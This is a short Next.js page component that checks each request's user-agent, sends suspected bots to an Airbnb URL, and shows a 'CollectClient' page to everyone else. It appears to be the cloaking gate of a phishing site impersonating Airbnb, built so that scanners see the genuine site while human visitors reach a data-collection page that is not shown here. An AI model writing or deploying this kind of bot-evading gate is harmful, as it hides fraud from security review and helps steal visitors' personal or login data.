import { headers } from "next/headers";
import { redirect } from "next/navigation";
import CollectClient from "@/app/CollectClient";
import { AIRBNB_URL } from "@/lib/constants";
import { isObviousBot } from "@/lib/bots";

export const dynamic = "force-dynamic";

export default async function GateHome() {
  const h = await headers();
  const ua = h.get("user-agent") || "";
  if (isObviousBot(ua, h)) {
    redirect(AIRBNB_URL);
  }
  return <CollectClient />;
}
